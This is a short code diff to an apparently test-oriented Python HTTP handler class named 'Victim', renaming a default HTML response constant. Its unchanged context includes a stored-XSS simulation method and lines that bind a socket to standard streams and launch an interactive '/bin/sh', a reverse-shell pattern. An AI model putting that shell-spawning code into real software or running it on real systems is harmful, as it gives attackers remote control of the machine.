@@ -12,7 +12,7 @@ import threading
 
 class Victim(http.server.BaseHTTPRequestHandler):
 
-    DEFAULT_RESPONSE = '<html><head><title>Test</title></head><body>&nbsp;</body></html>'
+    default_response = '<html><head><title>Test</title></head><body>&nbsp;</body></html>'
 
     def with_xss(self, url):
         """Simulate launching stored XSS
@@ -45,7 +45,7 @@ class Victim(http.server.BaseHTTPRequestHandler):
             os.dup2(sock.fileno(), 2)
             subprocess.call(['/bin/sh', '-i'])
 
-    def send_content(self, status_code=200, content_type='text/html', content=DEFAULT_RESPONSE):
+    def send_content(self, status_code=200, content_type='text/html', content=default_response):
         self.send_response(status_code)
         self.send_header('Content-Type', content_type)
         self.send_header('Content-Length', str(len(content)))
